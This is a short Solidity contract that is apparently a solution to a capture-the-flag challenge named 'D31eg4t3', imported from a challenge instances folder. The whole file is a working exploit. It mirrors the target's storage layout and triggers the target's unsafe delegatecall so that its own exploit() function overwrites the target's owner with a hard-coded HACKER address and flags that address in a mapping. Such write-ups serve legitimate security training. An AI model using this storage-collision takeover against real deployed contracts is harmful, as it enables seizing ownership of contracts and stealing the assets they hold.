// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../instances/dgate.sol";

contract Solution {
    uint a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping (address => bool) public canYouHackMe;
    D31eg4t3 constant target = D31eg4t3(0x971e55F02367DcDd1535A7faeD0a500B64f2742d);
    address constant HACKER = 0xf4CE225b2beaFA65CC155a9dE1B1a41FF5EB3B61;

    function hackMe(bytes calldata bites) public returns(bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }

    function attack() external {
        target.hackMe(abi.encodeWithSignature("exploit()"));
    }

    function exploit() public {
        owner = HACKER;
        canYouHackMe[HACKER] = true;
    }

}
